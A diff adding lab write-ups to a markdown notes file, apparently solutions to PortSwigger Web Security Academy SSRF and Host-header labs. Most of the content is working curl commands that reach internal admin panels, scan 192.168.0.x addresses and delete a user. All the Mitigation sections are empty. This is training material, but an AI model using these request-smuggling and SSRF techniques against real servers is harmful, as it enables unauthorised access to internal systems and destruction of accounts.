@@ -857,6 +857,45 @@ Delete user:
 
 Conduct proper (whitelisting) validation of `Host` header.
 
+### Lab: SSRF via flawed request parsing
+
+**Target**
+
+    https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing
+
+**Discovery**
+
+    curl --request-target "admin" --cookie '_lab=<_LAB_COOKIE>' -H "Host:d1f0j2osh1vbpmver478a51mwd23qs.burpcollaborator.net" -k -x 127.0.0.1:8080 -L https://ac561f811e00c696c030a39300a100a6.web-security-academy.net/
+
+Which sends following request (note the lack of leading slash in request line):
+
+```
+GET admin HTTP/1.1
+Host: d1f0j2osh1vbpmver478a51mwd23qs.burpcollaborator.net
+Cookie: _lab=<_LAB_COOKIE>
+User-Agent: curl/7.77.0
+Accept: */*
+Connection: close
+```
+
+**Analysis**
+
+**Exploitation**
+
+Finding internal IP of machine with admin panel:
+
+    for i in $(seq 1 254); do echo; echo -n "HTTP code (192.168.0.$i): "; curl --request-target "admin" --cookie '_lab=<_LAB_COOKIE>' -s -o /dev/null -w "%{http_code}" -k -x 127.0.0.1:8080 -H "Host:192.168.0.$i" https://ac561f811e00c696c030a39300a100a6.web-security-academy.net; done
+
+Getting `CSRF` token:
+
+    curl -s --request-target "admin" --cookie '_lab=<_LAB_COOKIE>' -H "Host:192.168.0.99" -k -x 127.0.0.1:8080 -L https://ac561f811e00c696c030a39300a100a6.web-security-academy.net/ | grep csrf | cut -d'"' -f6
+
+Deleting user:
+
+    curl -s --request-target 'admin/delete' --cookie '_lab=<_LAB_COOKIE>' -H "Host:192.168.0.99" -k -x 127.0.0.1:8080 -L https://ac561f811e00c696c030a39300a100a6.web-security-academy.net -d "username=carlos&csrf=BPr4IhyXjFpaBg94UtflJbU1l8XYJlTh"
+
+**Mitigation**
+
 ### Lab: Password reset poisoning via dangling markup
 
 **Target**
@@ -950,5 +989,35 @@ Do not rely solely on `Host` header as an authentication factor, in addition imp
 **Analysis**
 
 **Exploitation**
+
+**Mitigation**
+
+## SSRF
+
+### Lab: Basic SSRF against the local server
+
+**Target**
+
+    https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
+
+**Exploitation**
+
+    curl -s --cookie 'session=ad5aRkfuRv4ilMJfz3tVjYdDmA2103LA' -k -x 127.0.0.1:8080 -L https://ac651f3c1e02b956c01827ce004b0054.web-security-academy.net/product/stock -d "stockApi=http://localhost/admin/delete?username=carlos"
+
+**Mitigation**
+
+### Lab: Basic SSRF against another back-end system
+
+**Target**
+
+    https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
+
+**Discovery**
+
+    for i in $(seq 1 254); do echo; echo -n "HTTP code (192.168.0.$i): "; curl -s -o /dev/null -w "%{http_code}" --cookie 'session=5N9l2T48cjM2v8hcBUt3nXR7rbIn0s4C' -k -x 127.0.0.1:8080 -L https://acf61f111effb787c06c89ab00fb00f1.web-security-academy.net/product/stock -d "stockApi=http://192.168.0.$i:8080/admin"; done
+
+**Exploitation**
+
+    curl -s --cookie 'session=5N9l2T48cjM2v8hcBUt3nXR7rbIn0s4C' -k -x 127.0.0.1:8080 -L https://acf61f111effb787c06c89ab00fb00f1.web-security-academy.net/product/stock -d "stockApi=http://192.168.0.242:8080/admin/delete?username=carlos"
 
 **Mitigation**
